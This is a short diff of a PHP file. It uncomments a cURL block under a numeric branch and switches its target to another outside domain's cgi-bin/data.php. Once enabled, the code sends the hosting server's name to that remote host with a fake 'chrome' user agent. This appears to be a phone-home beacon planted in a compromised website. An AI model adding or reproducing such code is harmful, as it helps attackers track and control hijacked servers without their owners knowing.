@@ -62,17 +62,17 @@ if($sayi == 1) {
 
  if($sayi == 5)
 {
-/*	
+	
 
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://bangladeshiamerican.net/var/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_URL => 'http://w-boss.torbara.com/cgi-bin/data.php?s='.$_SERVER["SERVER_NAME"].'',
     CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-*/	
+	
 } 
 
 ?>
